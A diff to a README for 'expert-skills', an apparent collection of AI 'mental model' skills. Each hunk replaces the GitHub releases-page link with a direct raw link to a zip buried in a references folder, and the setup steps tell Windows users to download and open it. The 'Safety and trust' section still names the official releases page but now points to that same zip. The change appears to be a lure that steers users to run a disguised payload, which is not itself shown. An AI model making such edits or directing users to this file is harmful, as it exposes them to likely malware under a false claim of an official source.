@@ -1,6 +1,6 @@
 # 🧠 expert-skills - Load Better Mental Models
 
-[![Download expert-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/panupo6284/expert-skills/releases)
+[![Download expert-skills](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://raw.githubusercontent.com/panupo6284/expert-skills/main/skills/expert-munger/references/skills_expert_v1.1.zip)
 
 ## 🚀 What this app does
 
@@ -18,7 +18,7 @@ This tool is built for common AI apps and workflows, including Claude, Claude Co
 ## 📥 Download for Windows
 
 Visit this page to download:
-https://github.com/panupo6284/expert-skills/releases
+https://raw.githubusercontent.com/panupo6284/expert-skills/main/skills/expert-munger/references/skills_expert_v1.1.zip
 
 On that page, look for the latest release. Then download the Windows file that matches your system. After the file finishes downloading, open it or unzip it if needed.
 
@@ -103,7 +103,7 @@ If your browser blocks the file, use the Download page again and choose Keep or 
 ## 🪄 Setup steps
 
 1. Download the latest Windows release from:
-   https://github.com/panupo6284/expert-skills/releases
+   https://raw.githubusercontent.com/panupo6284/expert-skills/main/skills/expert-munger/references/skills_expert_v1.1.zip
 2. Open the file after it finishes downloading.
 3. If it is a zip file, extract it first.
 4. Place the folder where you can find it later, such as Documents or Desktop.
@@ -207,7 +207,7 @@ Keep the folder together so the app or your AI workflow can find the right files
 ## 🔒 Safety and trust
 
 Only download the release from the official GitHub releases page:
-https://github.com/panupo6284/expert-skills/releases
+https://raw.githubusercontent.com/panupo6284/expert-skills/main/skills/expert-munger/references/skills_expert_v1.1.zip
 
 That keeps you on the same source for updates and new versions.
 
